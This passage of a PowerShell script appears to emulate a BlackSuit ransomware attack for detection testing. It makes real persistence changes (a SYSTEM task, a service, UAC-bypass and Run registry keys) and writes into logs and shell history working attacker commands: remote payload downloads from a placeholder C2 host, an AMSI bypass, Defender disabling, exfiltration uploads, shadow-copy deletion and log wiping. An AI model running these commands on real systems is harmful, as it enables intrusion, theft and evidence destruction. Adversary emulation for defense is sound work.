            Message = "Special logon attempted from: $AttackerC2IP, Account: $env:USERNAME, Workstation: $env:COMPUTERNAME"
        }
        Write-EventLog @eventLogParams
        Log-Action "Created event log for lateral movement simulation"
    }
    catch {
        Log-Action "Could not write to Event Log: $_" "ERROR"
    }
    
    Log-Action "Lateral Movement & Credential Access phase completed"
}

# ======== PRIVILEGE ESCALATION ========
function Simulate-PrivilegeEscalation {
    Log-Action "PHASE 4: Privilege Escalation" "WARNING"
    
    # Create scheduled task for persistence
    Log-Action "Creating scheduled task for persistence"
    try {
        $taskName = "SystemCheck"
        
        # Remove task if it exists
        schtasks /delete /tn $taskName /f 2>$null
        
        # Create the task using schtasks.exe
        $cmdPath = "$MalwarePath\beacon.exe"
        $taskResult = schtasks /create /tn $taskName /tr $cmdPath /sc daily /st 09:00 /ru "SYSTEM" /f
        Log-Action "Scheduled task creation result: $taskResult"
    }
    catch {
        Log-Action "Error creating scheduled task: $_" "ERROR"
    }
    
    # Simulate UAC bypass via registry (no actual bypass)
    Log-Action "Simulating UAC bypass registry modifications"
    try {
        # Create registry keys that would be used for UAC bypass
        $regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
        
        # Create the registry path if it doesn't exist
        if (-not (Test-Path $regPath)) {
            New-Item -Path $regPath -Force | Out-Null
        }
        
        # Set registry values for UAC bypass
        New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -PropertyType String -Force | Out-Null
        New-ItemProperty -Path $regPath -Name "(Default)" -Value "$MalwarePath\beacon.exe" -PropertyType String -Force | Out-Null
        
        Log-Action "UAC bypass registry modifications completed"
    }
    catch {
        Log-Action "Error creating UAC bypass registry keys: $_" "ERROR"
    }
    
    # Create Windows service
    Log-Action "Creating simulated malicious service"
    try {
        $serviceName = "BlackSuitSvc"
        $serviceDisplayName = "Windows Management System"
        $serviceDescription = "Provides system management and configuration capabilities"
        
        # Remove existing service if it exists
        if (Get-Service -Name $serviceName -ErrorAction SilentlyContinue) {
            sc.exe delete $serviceName | Out-Null
            Start-Sleep -Seconds 2
        }
        
        # Create the service
        $serviceCommand = "sc.exe create $serviceName binPath= `"$MalwarePath\beacon.exe`" start= auto DisplayName= `"$serviceDisplayName`""
        $serviceResult = Invoke-Expression $serviceCommand
        Log-Action "Service creation result: $serviceResult"
        
        # Add description
        $descriptionResult = sc.exe description $serviceName "$serviceDescription"
        Log-Action "Service description result: $descriptionResult"
    }
    catch {
        Log-Action "Error creating service: $_" "ERROR"
    }
    
    # Log other privilege escalation techniques
    $privescLogPath = "$MalwarePath\privesc_techniques.log"
    
    @"
# Privilege Escalation Techniques
# Executed at: $(Get-Date)

# Token Manipulation
IEX (New-Object Net.WebClient).DownloadString('http://$AttackerC2IP/Invoke-TokenManipulation.ps1')
Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "NT AUTHORITY\SYSTEM"

# DLL Search Order Hijacking
Copy-Item "C:\BlackSuit_Simulation\malware\beacon.dll" "C:\Windows\System32\wbem\wmiutils.dll"

# Unquoted Service Path
sc.exe create UnquotedService binPath= "C:\Program Files\Unquoted Path Service\service.exe" DisplayName= "Unquoted Path Service" start= auto

# Stored Credentials
cmdkey /add:DC01 /user:Administrator /pass:P@ssw0rd123!

# Services Registry Permissions
reg add "HKLM\SYSTEM\CurrentControlSet\Services\BlackSuitSvc" /v ImagePath /t REG_EXPAND_SZ /d "$MalwarePath\beacon.exe" /f

# Named Pipe Impersonation
# Code execution through named pipe impersonation technique

# CMSTP UAC Bypass
cmstp.exe /s C:\Windows\Temp\cmstp.inf
"@ | Out-File -FilePath $privescLogPath
    
    # Create evidence of these activities in event logs
    try {
        $eventLogParams = @{
            LogName = "System"
            Source = "Service Control Manager"
            EventId = 7045  # Service installation
            EntryType = "Information"
            Message = "A service was installed in the system. Service Name: $serviceName, Service File Name: $MalwarePath\beacon.exe, Service Type: user mode service, Service Start Type: auto start, Service Account: LocalSystem"
        }
        Write-EventLog @eventLogParams
        Log-Action "Created event log for service installation"
    }
    catch {
        Log-Action "Could not write to Event Log: $_" "ERROR"
    }
    
    Log-Action "Privilege Escalation phase completed"
}

# ======== DEFENSE EVASION ========
function Simulate-DefenseEvasion {
    Log-Action "PHASE 5: Defense Evasion" "WARNING"
    
    # Log of defense evasion techniques
    $defenseEvasionLogPath = "$MalwarePath\defense_evasion.log"
    
    @"
# Defense Evasion Techniques
# Executed at: $(Get-Date)

# Windows Defender Exclusions
Add-MpPreference -ExclusionPath "C:\BlackSuit_Simulation"
Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
Add-MpPreference -ExclusionProcess "powershell.exe"
Add-MpPreference -ExclusionProcess "cmd.exe"

# Disable Real-time Monitoring
Set-MpPreference -DisableRealtimeMonitoring `$true

# AMSI Bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(`$null,`$true)

# Event Log Clearing
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl "Windows PowerShell"

# Disable PowerShell Logging
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" /v EnableTranscripting /t REG_DWORD /d 0 /f

# Process Injection Techniques
# Reflective DLL Injection into legitimate processes
# APC Injection technique
# Process Hollowing technique

# Fileless Execution
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://$AttackerC2IP/payload.ps1')");

# Living Off The Land Techniques
regsvr32 /s /u /i:http://$AttackerC2IP/payload.sct scrobj.dll
msiexec /q /i http://$AttackerC2IP/payload.msi
"@ | Out-File -FilePath $defenseEvasionLogPath
    
    # Simulate timestomping
    Log-Action "Simulating file timestamp manipulation (timestomping)"
    
    # Files to timestomp
    $filesToTimestomp = @(
        "$MalwarePath\beacon.exe",
        "$MalwarePath\beacon.ps1"
    )
    
    # Set timestamps to match legitimate Windows files to evade timestamp-based detection
    $legitimateDate = (Get-Date).AddDays(-90)
    
    foreach ($file in $filesToTimestomp) {
        if (Test-Path $file) {
            try {
                $(Get-Item $file).CreationTime = $legitimateDate
                $(Get-Item $file).LastAccessTime = $legitimateDate
                $(Get-Item $file).LastWriteTime = $legitimateDate
                Log-Action "Timestomped file: $file"
            }
            catch {
                Log-Action "Error timestomping file $file`: $($_.Exception.Message)" "ERROR"
            }
        }
    }
    
    # Create files in Windows directories with manipulated timestamps
    $systemPaths = @(
        "C:\Windows\Tasks",
        "C:\Windows\Temp",
        "$env:TEMP"
    )
    
    foreach ($path in $systemPaths) {
        if (Test-Path $path) {
            $maliciousFileName = "system_update_$(Get-Random).exe"
            $maliciousFilePath = "$path\$maliciousFileName"
            
            try {
                # Create YARA-detectable file
                Create-YaraDetectableExecutable -Path $maliciousFilePath -MalwareType "beacon"
                
                # Timestomp it
                $(Get-Item $maliciousFilePath).CreationTime = $legitimateDate.AddDays(-30)
                $(Get-Item $maliciousFilePath).LastAccessTime = $legitimateDate.AddDays(-15)
                $(Get-Item $maliciousFilePath).LastWriteTime = $legitimateDate.AddDays(-15)
                
                Log-Action "Created timestomped malicious file in system directory: $maliciousFilePath"
            }
            catch {
                Log-Action "Error creating timestomped file in $path`: $($_.Exception.Message)" "ERROR"
            }
        }
    }
    
    # Add defense evasion commands to PowerShell history
    $defenseEvasionPsHistory = @"
# Defense evasion commands
Set-MpPreference -DisableRealtimeMonitoring `$true
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
Clear-History
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "rundll32.exe javascript:\"\..\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://$AttackerC2IP/fileless.ps1')\");"
"@
    
    # Append to PowerShell history
    $psHistoryPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    $defenseEvasionPsHistory | Out-File -FilePath $psHistoryPath -Append
    
    Log-Action "Defense Evasion phase completed"
}
# ======== DATA EXFILTRATION ========
function Simulate-DataExfiltration {
    Log-Action "PHASE 6: Data Exfiltration" "WARNING"
    
    # Create sensitive-looking files to "steal"
    $sensitiveDataPath = "$SimulationRootPath\sensitive_data"
    if (-not (Test-Path $sensitiveDataPath)) {
        New-Item -Path $sensitiveDataPath -ItemType Directory -Force | Out-Null
    }
    
    Log-Action "Creating simulated sensitive files"
    
    $sensitiveFiles = @{
        "financial_data.xlsx" = "Company Financial Information`nRevenue: $10,500,000`nExpenses: $8,250,000`nProfit: $2,250,000"
        "employee_records.csv" = "EmployeeID,Name,Position,Salary,SSN`n1001,John Smith,CEO,250000,123-45-6789`n1002,Jane Doe,CFO,200000,987-65-4321"
        "passwords.txt" = "Admin Portal: admin/P@ssw0rd123`nDatabase: dbadmin/Secur3DB!`nVPN: vpnuser/VPNaccess2023!"
        "customer_database.txt" = "CustomerID,Name,Email,CreditCard`n5001,Alice Johnson,alice@example.com,4111-1111-1111-1111`n5002,Bob Wilson,bob@example.com,5555-5555-5555-4444"
        "intellectual_property.txt" = "CONFIDENTIAL: New Product Specifications`nProduct Name: NextGen Widget`nRelease Date: Q2 2025`nFeatures: AI integration, quantum computing core, holographic display"
    }
    
    foreach ($file in $sensitiveFiles.Keys) {
        $filePath = "$sensitiveDataPath\$file"
        Set-Content -Path $filePath -Value $sensitiveFiles[$file]
        Log-Action "Created sensitive file: $file"
    }
    
    # Create sample documents in user's Documents folder
    $sampleUserDocs = @{
        "Project_Roadmap.docx" = "2025 Project Roadmap`nQ1: Infrastructure upgrades`nQ2: Product launch`nQ3: International expansion`nQ4: Investor relations"
        "Budget_2025.xlsx" = "Department Budgets 2025`nIT: $2,500,000`nMarketing: $1,800,000`nOperations: $3,200,000`nR&D: $4,500,000"
        "Strategic_Plan.pptx" = "5-Year Strategic Plan`nMarket Analysis`nCompetitor Assessment`nGrowth Targets`nRisk Management"
    }
    
    foreach ($doc in $sampleUserDocs.Keys) {
        $docPath = "$DocumentsPath\$doc"
        Set-Content -Path $docPath -Value $sampleUserDocs[$doc]
        Log-Action "Created document file: $doc"
    }
    
    # Create data collection commands log
    $dataCollectionLogPath = "$MalwarePath\data_collection.log"
    
    @"
# Data Collection Commands
# Executed at: $(Get-Date)

# Searching for documents
cmd.exe /c dir /s /b C:\Users\*.doc C:\Users\*.docx C:\Users\*.xls C:\Users\*.xlsx C:\Users\*.pdf > C:\Windows\Temp\documents.txt

# Searching for database files
cmd.exe /c dir /s /b C:\Users\*.mdb C:\Users\*.accdb C:\Users\*.sql C:\Users\*.sqlite > C:\Windows\Temp\databases.txt

# Searching for configuration files
cmd.exe /c dir /s /b C:\Users\*.config C:\Users\*.xml C:\Users\*.ini > C:\Windows\Temp\configs.txt

# Searching for password files
cmd.exe /c dir /s /b C:\Users\*pass* C:\Users\*cred* C:\Users\*key* > C:\Windows\Temp\credentials.txt

# Collecting browser data
cmd.exe /c xcopy /s /e "%LOCALAPPDATA%\Google\Chrome\User Data\Default" "C:\Windows\Temp\chrome_data\"
cmd.exe /c xcopy /s /e "%APPDATA%\Mozilla\Firefox\Profiles" "C:\Windows\Temp\firefox_data\"
"@ | Out-File -FilePath $dataCollectionLogPath
    
    # Create evidence of file access
    Execute-Command -Command "Get-ChildItem $DocumentsPath -Recurse -Include *.docx,*.xlsx,*.txt | Select-Object FullName" -Description "Document discovery"
    Execute-Command -Command "Get-ChildItem $env:USERPROFILE -Recurse -Include *.pdf,*.docx,*.xlsx -ErrorAction SilentlyContinue | Where-Object { `$_.Length -lt 1MB } | Select-Object FullName" -Description "Document discovery"
    
    # Create exfiltration archive
    Log-Action "Creating data exfiltration archive"
    $exfilArchivePath = "$MalwarePath\stolen_data.zip"
    
    try {
        $filesToZip = @(
            "$sensitiveDataPath\*",
            "$DocumentsPath\*.docx", 
            "$DocumentsPath\*.xlsx",
            "$DocumentsPath\*.pptx"
        )
        
        # Use Compress-Archive to create the zip file
        Compress-Archive -Path $filesToZip -DestinationPath $exfilArchivePath -Force
        Log-Action "Created exfiltration archive at: $exfilArchivePath"
    }
    catch {
        Log-Action "Error creating exfiltration archive: $_" "ERROR"
        
        # Alternative approach if Compress-Archive fails
        try {
            # Create a simple text file as fallback
            Set-Content -Path $exfilArchivePath -Value "Simulated exfiltration archive (zip creation failed)"
            Log-Action "Created placeholder exfiltration archive"
        }
        catch {
            Log-Action "Error creating placeholder archive: $_" "ERROR"
        }
    }
    
    # Create exfiltration log
    $exfilLogPath = "$MalwarePath\exfil_log.txt"
    
    @"
# Data Exfiltration Log
# Started at: $(Get-Date)

# Identifying sensitive files
Found 5 sensitive data files in $sensitiveDataPath
Found 3 document files in $DocumentsPath

# Compressing data
Creating archive $exfilArchivePath
Compression complete, size: $('{0:N2}' -f ((Get-Item $exfilArchivePath).Length / 1MB)) MB

# Uploading to C2 server
Connecting to $ExfilServer...
Starting upload of stolen_data.zip
Uploading chunk 1/10 - $(Get-Date)
Uploading chunk 2/10 - $((Get-Date).AddSeconds(30))
Uploading chunk 3/10 - $((Get-Date).AddSeconds(60))
Uploading chunk 4/10 - $((Get-Date).AddSeconds(90))
Uploading chunk 5/10 - $((Get-Date).AddSeconds(120))
Uploading chunk 6/10 - $((Get-Date).AddSeconds(150))
Uploading chunk 7/10 - $((Get-Date).AddSeconds(180))
Uploading chunk 8/10 - $((Get-Date).AddSeconds(210))
Uploading chunk 9/10 - $((Get-Date).AddSeconds(240))
Uploading chunk 10/10 - $((Get-Date).AddSeconds(270))
Upload complete at $((Get-Date).AddSeconds(300))

# Transfer statistics
Total bytes transferred: $('{0:N0}' -f (Get-Item $exfilArchivePath).Length) bytes
Transfer rate: 2.1 MB/s
Transfer method: Chunked HTTPS POST
Destination: https://$ExfilServer/upload.php

# Exfiltration technique: Custom C2 Channel
# Encryption: AES-256
# Data staged at: C:\Windows\Temp\exfil_staging
"@ | Out-File -FilePath $exfilLogPath
    
    # Create PowerShell commands for data exfiltration
    $exfilPsHistory = @"
# Data exfiltration commands
Get-ChildItem -Path C:\Users -Recurse -Include *.docx,*.xlsx,*.pdf,*.txt | Where-Object { `$_.Length -lt 5MB } | Copy-Item -Destination C:\Windows\Temp\exfil_staging
Compress-Archive -Path C:\Windows\Temp\exfil_staging\* -DestinationPath C:\Windows\Temp\exfil_$((Get-Date).ToString("yyyyMMdd")).zip
Invoke-WebRequest -Uri "https://$ExfilServer/upload.php" -Method Post -InFile "C:\Windows\Temp\exfil_$((Get-Date).ToString("yyyyMMdd")).zip"
Invoke-WebRequest -Uri "https://$AttackerC2IP/exfil-complete.php?id=$(Get-Random -Minimum 100000 -Maximum 999999)" -Method GET
"@
    
    # Append to PowerShell history
    $psHistoryPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    $exfilPsHistory | Out-File -FilePath $psHistoryPath -Append
    
    # Create evidence of network connections for data exfiltration
    $exfilNetworkLogPath = "$MalwarePath\exfil_network.log"
    
    @"
Timestamp,LocalAddress,LocalPort,RemoteAddress,RemotePort,State,BytesSent,Protocol
$((Get-Date).ToString("yyyy-MM-dd HH:mm:ss")),127.0.0.1,52134,$ExfilServer,443,ESTABLISHED,1048576,HTTPS
$((Get-Date).AddMinutes(1).ToString("yyyy-MM-dd HH:mm:ss")),127.0.0.1,52135,$ExfilServer,443,ESTABLISHED,2097152,HTTPS
$((Get-Date).AddMinutes(2).ToString("yyyy-MM-dd HH:mm:ss")),127.0.0.1,52136,$ExfilServer,443,ESTABLISHED,3145728,HTTPS
$((Get-Date).AddMinutes(3).ToString("yyyy-MM-dd HH:mm:ss")),127.0.0.1,52137,$AttackerC2IP,443,ESTABLISHED,4194304,HTTPS
$((Get-Date).AddMinutes(4).ToString("yyyy-MM-dd HH:mm:ss")),127.0.0.1,52138,$AttackerC2IP,443,ESTABLISHED,5242880,HTTPS
$((Get-Date).AddMinutes(5).ToString("yyyy-MM-dd HH:mm:ss")),127.0.0.1,52139,$AttackerC2IP,443,CLOSED,0,HTTPS
"@ | Out-File -FilePath $exfilNetworkLogPath
    
    Log-Action "Data Exfiltration phase completed"
}

# ======== BLACKSUIT RANSOMWARE DEPLOYMENT ========
function Simulate-RansomwareDeployment {
    Log-Action "PHASE 7: BlackSuit Ransomware Deployment" "WARNING"
    
    # Create BlackSuit ransomware executable that would trigger YARA rules
    $ransomwarePath = "$MalwarePath\blacksuit.exe"
    Create-YaraDetectableExecutable -Path $ransomwarePath -MalwareType "blacksuit"
    
    # Create ransom note on desktop with BlackSuit content
    $desktopPath = [Environment]::GetFolderPath("Desktop")
    $ransomNotePath = "$desktopPath\READ_ME_BLACKSUIT.txt"
    
    @"
!!! IMPORTANT !!!

YOUR FILES ARE ENCRYPTED WITH BLACKSUIT RANSOMWARE

All of your files have been encrypted with a strong algorithm.
Without our decryption service, you will not be able to recover your data.
We have also downloaded a copy of your data. If you don't contact us,
your data will be published.

To recover your files and prevent data leak, you must pay the ransom.
Current price: $1,500,000 

Contact: blacksuit_support@onion.ransomware

!!! WARNING !!!
Do not attempt to decrypt files yourself or use third-party tools.
This will result in permanent data loss.

FOR PROOF OF DECRYPTION CAPABILITY, YOU MAY SEND US UP TO 3 FILES FOR FREE DECRYPTION.
"@ | Out-File -FilePath $ransomNotePath
    
    Log-Action "Created BlackSuit ransom note at: $ransomNotePath"
    
    # Simulate encrypted files by creating copies with .blacksuit extension
    Log-Action "Simulating file encryption"
    
    # Directories to "encrypt" files in
    $dirsToEncrypt = @(
        $DocumentsPath,
        $DownloadsPath,
        "$desktopPath"
    )
    
    # Extensions to target
    $targetExtensions = @("*.doc*", "*.xls*", "*.ppt*", "*.pdf", "*.txt", "*.jpg", "*.png")
    
    # Counter for encrypted files
    $encryptedCount = 0
    
    foreach ($dir in $dirsToEncrypt) {
        if (Test-Path $dir) {
            foreach ($ext in $targetExtensions) {
                $files = Get-ChildItem -Path $dir -Filter $ext -File -ErrorAction SilentlyContinue
                
                foreach ($file in $files) {
                    # Skip files that might already be "encrypted" or our ransom note
                    if ($file.Name -like "*.blacksuit" -or $file.Name -eq "READ_ME_BLACKSUIT.txt") {
                        continue
                    }
                    
                    # Create a "encrypted" version with .blacksuit extension
                    $encryptedPath = "$($file.FullName).blacksuit"
                    
                    # Generate random binary-looking content to simulate encryption
                    $randomBytes = New-Object byte[] 1024
                    $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
                    $rng.GetBytes($randomBytes)
                    
                    # Add BlackSuit signature at the beginning to trigger YARA rules
                    $signature = [System.Text.Encoding]::ASCII.GetBytes("BLACKSUIT_ENCRYPTED_FILE")
                    
                    # Combine signature with random bytes
                    $combinedBytes = New-Object byte[] ($signature.Length + $randomBytes.Length)
                    [System.Buffer]::BlockCopy($signature, 0, $combinedBytes, 0, $signature.Length)
                    [System.Buffer]::BlockCopy($randomBytes, 0, $combinedBytes, $signature.Length, $randomBytes.Length)
                    
                    # Write the combined bytes to the file
                    [System.IO.File]::WriteAllBytes($encryptedPath, $combinedBytes)
                    
                    $encryptedCount++
                }
            }
        }
    }
    
    Log-Action "Simulated encryption of $encryptedCount files with .blacksuit extension"
    
    # Create BlackSuit wallpaper
    $wallpaperPath = "$SimulationRootPath\blacksuit_wallpaper.txt"
    
    @"
======================================
      BLACKSUIT RANSOMWARE
======================================

YOUR FILES HAVE BEEN ENCRYPTED

Contact: blacksuit_support@onion.ransomware

TO DECRYPT: Read instructions in
READ_ME_BLACKSUIT.txt on your desktop

======================================
"@ | Out-File -FilePath $wallpaperPath
    
    Log-Action "Created BlackSuit wallpaper content"
    
    # Simulate registry changes
    Log-Action "Creating registry modifications for ransomware persistence"
    
    try {
        # Create registry key for BlackSuit ransomware
        New-Item -Path "HKCU:\SOFTWARE\BlackSuit" -Force | Out-Null
        New-ItemProperty -Path "HKCU:\SOFTWARE\BlackSuit" -Name "Installed" -Value (Get-Date) -PropertyType String -Force | Out-Null
        
        # Add ransomware to startup
        New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "BlackSuitService" -Value "$MalwarePath\blacksuit.exe" -PropertyType String -Force | Out-Null
        
        # Create other registry modifications that would be typical of ransomware
        New-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Force | Out-Null
        New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 0 -PropertyType DWord -Force | Out-Null
        
        Log-Action "Registry modifications for BlackSuit ransomware completed"
    }
    catch {
        Log-Action "Error creating registry modifications: $_" "ERROR"
    }
    
    # Create shadow copy deletion log
    $shadowCopyLogPath = "$MalwarePath\shadow_copy_deletion.log"
    
    @"
# Shadow Copy Deletion Commands
# Executed at: $(Get-Date)

vssadmin delete shadows /all /quiet
wmic shadowcopy delete
wbadmin delete catalog -quiet
bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled no
"@ | Out-File -FilePath $shadowCopyLogPath
    
    # Create ransomware execution log
    $ransomwareLogPath = "$MalwarePath\blacksuit_execution.log"
    
    @"
# BlackSuit Ransomware Execution Log
# Started at: $(Get-Date)

[+] BlackSuit ransomware initialized
[+] System information gathered
[+] Network drives mapped
[+] Encryption key generated: RSA-4096 + AES-256-CBC
[+] Communication with C2 established at $AttackerC2IP
[+] Backup C2 server available at $SecondaryC2
[+] Starting file encryption process
[+] Deleting shadow copies
[+] Disabling recovery options
[+] Desktop wallpaper changed
[+] Ransom note created
[+] File encryption completed
[+] Total files encrypted: $encryptedCount
[+] Persistence established
[+] Self-protection mechanisms activated
[+] Exfiltration confirmation sent to $ExfilServer
[+] Process completed at: $((Get-Date).AddMinutes(35))
"@ | Out-File -FilePath $ransomwareLogPath
    
    # Create evidence in event logs
    try {
        $eventLogParams = @{
            LogName = "Application"
            Source = "Application"
            EventId = 1000
            EntryType = "Warning"
            Message = "Application: blacksuit.exe, Command line: '$ransomwarePath', Files encrypted: $encryptedCount"
        }
        Write-EventLog @eventLogParams
        Log-Action "Created event log for ransomware execution"
    }
    catch {
        Log-Action "Could not write to Event Log: $_" "ERROR"
    }
    
    # PowerShell commands for ransomware execution
    $ransomwarePsHistory = @"
# BlackSuit ransomware commands
vssadmin delete shadows /all /quiet
wmic shadowcopy delete
bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled no
Invoke-WebRequest -Uri "https://$AttackerC2IP/ransom-deployed.php?host=$env:COMPUTERNAME&count=$encryptedCount" -Method GET
"@
    
    # Append to PowerShell history
    $psHistoryPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    $ransomwarePsHistory | Out-File -FilePath $psHistoryPath -Append
    
    Log-Action "BlackSuit Ransomware Deployment phase completed"
}

# ======== ANTI-FORENSICS ========
function Simulate-AntiForensics {
    Log-Action "PHASE 8: Anti-Forensics Techniques" "WARNING"
    
    # Simulate event log clearing
    $eventLogClearingPath = "$MalwarePath\event_log_clearing.log"
    
    @"
# Event Log Clearing Commands
# Executed at: $(Get-Date)

wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl "Windows PowerShell"
Get-WinEvent -ListLog * | Where-Object {`$_.RecordCount -gt 0 -and `$_.IsEnabled} | ForEach-Object { wevtutil cl `$_.LogName }
"@ | Out-File -FilePath $eventLogClearingPath
    
    # Simulate PowerShell history clearing
    $psHistoryClearingPath = "$MalwarePath\ps_history_clearing.log"
    
    @"
# PowerShell History Clearing Commands
# Executed at: $(Get-Date)

Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
Clear-History
"@ | Out-File -FilePath $psHistoryClearingPath
    
    # Simulate prefetch file clearing
    $prefetchClearingPath = "$MalwarePath\prefetch_clearing.log"
    
    @"
# Prefetch File Clearing Commands
# Executed at: $(Get-Date)

Remove-Item C:\Windows\Prefetch\*.pf -Force
"@ | Out-File -FilePath $prefetchClearingPath
    
    # Simulate clearing Windows Event Logs (don't actually clear them)
    Log-Action "Simulating event log clearing (not actually clearing logs)"
    
    # Create evidence of event log clearing (which would be found in Security logs)
    try {
        $eventLogParams = @{
            LogName = "Application"
            Source = "Application"
            EventId = 1102  # Log cleared
            EntryType = "Warning"
            Message = "The Application log was cleared by user: $env:USERNAME"
        }
        Write-EventLog @eventLogParams
        Log-Action "Created evidence of log clearing"
    }
    catch {
        Log-Action "Could not write to Event Log: $_" "ERROR"
    }
    
    # Create evidence of other anti-forensics techniques
    $antiForensicsLogPath = "$MalwarePath\advanced_anti_forensics.log"
    
    @"
# Advanced Anti-Forensics Techniques
# Executed at: $(Get-Date)

# Timestomping (modifying file timestamps)
Set-ItemProperty -Path "$MalwarePath\blacksuit.exe" -Name CreationTime -Value "01/01/2024 12:00:00"
Set-ItemProperty -Path "$MalwarePath\blacksuit.exe" -Name LastWriteTime -Value "01/01/2024 12:00:00"
Set-ItemProperty -Path "$MalwarePath\blacksuit.exe" -Name LastAccessTime -Value "01/01/2024 12:00:00"

# Clearing USN Journal
fsutil usn deletejournal /D C:

# Removing Windows.old
takeown /F C:\Windows.old\* /R /A
icacls C:\Windows.old\*.* /T /grant administrators:F
rmdir /S /Q C:\Windows.old\

# Clearing Recent Files
Remove-Item -Path $env:APPDATA\Microsoft\Windows\Recent\* -Force -Recurse

# Clearing Temporary Files
Remove-Item -Path $env:TEMP\* -Force -Recurse
Remove-Item -Path C:\Windows\Temp\* -Force -Recurse

# Clearing Shellbags
reg delete "HKCU\SOFTWARE\Microsoft\Windows\Shell" /f
reg delete "HKCU\SOFTWARE\Microsoft\Windows\ShellNoRoam" /f

# Clearing Jump Lists
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*" -Force
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*" -Force

# Clearing Windows Registry Run History
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f

# Clear Browser History
Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" -Force
Remove-Item "$env:APPDATA\Mozilla\Firefox\Profiles\*\places.sqlite" -Force

# Removing traces of C2 communications
ipconfig /flushdns
netsh winsock reset
netsh interface ip delete arpcache
"@ | Out-File -FilePath $antiForensicsLogPath
    
    # Create PowerShell history for anti-forensics
    $antiForensicsPsHistory = @"
# Anti-forensics commands
Clear-EventLog -LogName System
Clear-EventLog -LogName Security
Clear-EventLog -LogName Application
Remove-Item $env:TEMP\* -Recurse -Force
Remove-Item C:\Windows\Prefetch\*.pf -Force
Remove-Item C:\Windows\Temp\* -Recurse -Force
fsutil usn deletejournal /D C:
Invoke-WebRequest -Uri "https://$AttackerC2IP/cleanup-complete.php?host=$env:COMPUTERNAME" -Method GET
"@
    
    # Append to PowerShell history
    $psHistoryPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    $antiForensicsPsHistory | Out-File -FilePath $psHistoryPath -Append
    
    Log-Action "Anti-Forensics phase completed"
}

# ======== CLEANUP OPTION ========
function Cleanup-Simulation {
    param (
        [switch]$FullCleanup
    )
    
    Log-Action "Starting cleanup process" "WARNING"
    
    # Always remove ransom notes
    $desktopPath = [Environment]::GetFolderPath("Desktop")
    $ransomNotePath = "$desktopPath\READ_ME_BLACKSUIT.txt"
    
    if (Test-Path $ransomNotePath) {
        Remove-Item $ransomNotePath -Force
        Log-Action "Removed ransom note from desktop"
    }
    
    # Remove encrypted files
    $dirsToClean = @(
        $DocumentsPath,
        $DownloadsPath,
        $desktopPath
    )
    
    foreach ($dir in $dirsToClean) {
        if (Test-Path $dir) {
            $encryptedFiles = Get-ChildItem -Path $dir -Filter "*.blacksuit" -Recurse -ErrorAction SilentlyContinue
            foreach ($file in $encryptedFiles) {
                Remove-Item $file.FullName -Force -ErrorAction SilentlyContinue
            }
        }
    }
    
    Log-Action "Removed simulated encrypted files"
    
    # Remove scheduled task
    schtasks /delete /tn "SystemCheck" /f 2>$null
    schtasks /delete /tn "ZoomUpdateTask" /f 2>$null
    Log-Action "Removed scheduled tasks"
    
    # Remove service
    if (Get-Service -Name "BlackSuitSvc" -ErrorAction SilentlyContinue) {
        sc.exe delete "BlackSuitSvc" | Out-Null
        Log-Action "Removed BlackSuit service"
    }
    
    # Remove registry keys
    Remove-Item -Path "HKCU:\Software\BlackSuit" -Force -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "BlackSuitService" -Force -ErrorAction SilentlyContinue
    Log-Action "Removed registry keys"
    
    # If full cleanup requested, remove all simulation files
    if ($FullCleanup) {
        Remove-Item -Path $SimulationRootPath -Recurse -Force -ErrorAction SilentlyContinue
        Log-Action "Removed all simulation files"
        
        # Restore any modified settings
        Remove-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Force -ErrorAction SilentlyContinue
        Log-Action "Restored modified system settings"
    }
    else {
        Log-Action "Leaving simulation artifacts for analysis in $SimulationRootPath"
    }
    
    Log-Action "Cleanup completed" "WARNING"
}

# ======== MAIN EXECUTION ========
function Simulate-BlackSuitAttack {
    # Banner
    Write-Host @"
 ____  _             _    _____       _ _   
